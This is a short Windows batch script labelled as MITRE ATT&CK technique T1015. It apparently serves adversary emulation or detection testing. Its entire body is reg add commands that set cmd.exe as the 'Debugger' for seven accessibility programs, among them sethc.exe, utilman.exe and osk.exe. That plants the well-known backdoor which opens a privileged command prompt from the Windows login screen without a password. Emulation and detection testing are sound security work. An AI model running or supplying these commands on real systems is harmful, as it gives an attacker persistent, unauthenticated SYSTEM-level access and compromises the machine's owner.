@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Accessibility Features	(T1015)
ECHO.
ECHO [+] Add Registry Keys to abuse Accessibility Features
ECHO 	- HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
ECHO -------------------------------------------------------------------
cmd /c reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
cmd /c reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
cmd /c reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
cmd /c reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
cmd /c reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
cmd /c reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
cmd /c reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
ECHO.

